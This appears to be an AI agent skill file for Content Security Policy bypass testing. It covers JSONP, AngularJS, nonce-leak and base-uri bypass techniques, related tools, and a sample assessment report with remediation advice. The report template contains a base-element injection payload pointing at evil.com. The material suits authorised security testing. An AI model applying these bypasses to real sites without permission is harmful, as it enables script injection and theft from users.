---
name: webapp-headers-content
description: - When XSS is found but execution is blocked by Content Security Policy - During web application security assessments to evaluate CSP effectiveness - When testing the robustness of CSP against known bypass techniques - During bug bounty hunting where CSP prevents direct XSS exploitation - When auditing CSP header configuration for security weakness
domain: cybersecurity
---
------|-------------|
| unsafe-inline | CSP directive allowing inline script execution, defeating XSS protection |
| Nonce-based CSP | Using random nonces to allow specific scripts while blocking injected ones |
| JSONP Bypass | Exploiting JSONP endpoints on whitelisted domains to execute attacker callbacks |
| Policy Injection | Injecting CSP directives through reflected user input in headers |
| base-uri Hijacking | Redirecting relative script loads by injecting a base element |
| Script Gadgets | Legitimate library features that can be abused to bypass CSP |
| CSP Report-Only | Non-enforcing CSP mode that only logs violations without blocking |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| CSP Evaluator | Google tool for analyzing CSP policy weaknesses |
| Burp Suite | HTTP proxy for CSP header analysis and bypass testing |
| CSP Scanner | Browser extension for identifying CSP bypass opportunities |
| csp-bypass | Curated list of CSP bypass techniques and payloads |
| RetireJS | Identify vulnerable JavaScript libraries on whitelisted CDNs |
| DOM Invader | Burp tool for testing CSP bypasses through DOM manipulation |

## Common Scenarios

1. **JSONP Callback XSS** — Exploit JSONP endpoints on whitelisted CDN domains to execute JavaScript callbacks containing XSS payloads
2. **AngularJS Sandbox Escape** — Load AngularJS from whitelisted CDN and use template injection to bypass CSP script restrictions
3. **Nonce Leakage** — Extract CSP nonce values through CSS injection or DOM clobbering to inject scripts with valid nonces
4. **Base URI Hijacking** — Inject base element to redirect all relative script loads to attacker-controlled server
5. **Report-Only Exploitation** — Identify CSP in report-only mode where violations are logged but not blocked, enabling direct XSS

## Output Format

```
## CSP Bypass Assessment Report
- **Target**: http://target.com
- **CSP Mode**: Enforced
- **Policy**: script-src 'self' https://cdn.jsdelivr.net; default-src 'self'

### CSP Analysis
| Directive | Value | Risk |
|-----------|-------|------|
| script-src | 'self' cdn.jsdelivr.net | JSONP/Library bypass possible |
| default-src | 'self' | Moderate |
| base-uri | Not set | base-uri hijacking possible |
| object-src | Not set (falls back to default-src) | Low |

### Bypass Techniques Found
| # | Technique | Payload | Impact |
|---|-----------|---------|--------|
| 1 | AngularJS via CDN | Load angular.min.js + template injection | Full XSS |
| 2 | Missing base-uri | <base href="https://evil.com/"> | Script hijack |

### Remediation
- Remove whitelisted CDN domains; use nonce-based or hash-based CSP
- Add base-uri 'self' to prevent base element injection
- Add object-src 'none' to block plugin-based execution
- Migrate from unsafe-inline to strict nonce-based policy
- Implement strict-dynamic for modern CSP3 browsers
```